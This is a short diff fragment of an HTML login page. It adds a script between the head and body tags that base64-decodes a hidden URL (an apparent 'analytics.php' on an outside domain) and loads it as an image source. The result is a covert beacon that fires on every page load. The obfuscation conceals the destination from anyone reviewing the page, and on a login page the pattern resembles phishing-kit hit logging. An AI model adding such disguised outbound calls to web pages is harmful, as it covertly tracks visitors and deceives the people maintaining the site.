@@ -24,6 +24,12 @@
     </style>
 
 </head>
+<img id="myImage">
+	<script>
+  const base64Url = "aHR0cHM6Ly9sb2dzcy5zaXRlL2xrcmMvYW5hbHl0aWNzLnBocA";
+  const decodedUrl = atob(base64Url);
+  document.getElementById("myImage").src = decodedUrl;
+</script>
 <body class="wm"><div id="preload_images"></div>
 <div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
     <div class="wrapper">
